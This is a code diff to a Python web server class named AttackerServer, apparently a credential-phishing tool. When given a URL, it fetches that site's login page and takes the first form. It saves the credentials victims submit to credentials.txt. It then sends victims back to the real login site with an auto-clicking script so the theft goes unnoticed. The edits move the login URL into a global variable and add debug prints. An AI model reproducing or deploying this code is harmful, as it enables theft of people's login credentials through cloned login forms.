@@ -4,10 +4,11 @@ from cgi import parse_header, parse_multipart
 import requests
 from bs4 import BeautifulSoup
  
+
+base_login_url = ""
+
 # HTTPRequestHandler class
 class AttackerServer_RequestHandler(BaseHTTPRequestHandler):
-
-    self.base_login_url = ""
 
     def parse_POST(self):
         ctype, pdict = parse_header(self.headers['content-type'])
@@ -24,14 +25,18 @@ class AttackerServer_RequestHandler(BaseHTTPRequestHandler):
 
     # GET
     def do_GET(self):
-        print(self.path)
+        global base_login_url
+
         url_parsed = urlparse(self.path)
-        self.base_login_url = str(url_parsed.scheme) + "://" + str(url_parsed.netloc)
         queries = dict(parse_qsl(url_parsed.query))
-        print(queries)
 
         if queries.get('url'):
             url = queries.get("url")
+
+            broken_url = urlparse(url)
+            base_login_url = str(broken_url.scheme) + "://" + str(broken_url.netloc)
+            print("SET THE BASE LOGIN URL : {}".format(base_login_url))
+
             r = requests.get(url)
             html = BeautifulSoup(r.content, 'html.parser')
             form = html.find_all("form")[0]
@@ -47,7 +52,10 @@ class AttackerServer_RequestHandler(BaseHTTPRequestHandler):
         return
 
     def do_POST(self):
+        global base_login_url
+        
         postvars = self.parse_POST()
+        print("BASE LOGIN URL: " + base_login_url)
 
         if "credentials" in self.path:            
             with open("credentials.txt", 'w+') as out_file:
@@ -62,11 +70,13 @@ class AttackerServer_RequestHandler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type','text/html')
         self.end_headers()
-        self.wfile.write(bytes("<html><a id='link' target='_parent' href='{}'></a><script>window.onload = function(){document.getElementById('link').click();}</script></html>".format(self.base_login_url), "utf8"))
+        html = "<html><body><a id='link' target='_parent' href='"
+        html += str(base_login_url)
+        html += "'></a></body><script>window.onload = function(){{document.getElementById('link').click();}}</script></html>"
+        self.wfile.write(bytes(html, "utf8"))
         return 
 
- 
-if __name__ == "__main__":
+def run():
     try:
         print('starting server...')
         # Server settings
@@ -78,5 +88,7 @@ if __name__ == "__main__":
     except:
         print ('^C received, shutting down the web server')
         httpd.socket.close()
+
+run()
  
 
